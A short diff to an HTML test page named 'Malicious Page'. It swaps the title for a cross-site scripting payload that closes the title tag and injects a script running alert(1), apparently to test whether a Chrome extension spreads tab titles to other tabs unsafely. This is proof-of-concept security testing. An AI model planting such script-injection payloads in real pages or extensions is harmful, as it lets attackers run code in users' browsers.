@@ -24,12 +24,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Malicious Page</title>
     <script>
-        // Set the title to a malicious payload
-        document.title = "alert(1)";
+        document.title = "</title><script>alert(1)</script>";
     </script>
 </head>
 <body>
-    <h1>This is a malicious page!</h1>
-    <p>If the Chrome extension is active, it may propagate the title to other tabs, potentially triggering XSS.</p>
+    <h1>Please Work</h1>
 </body>
 </html>
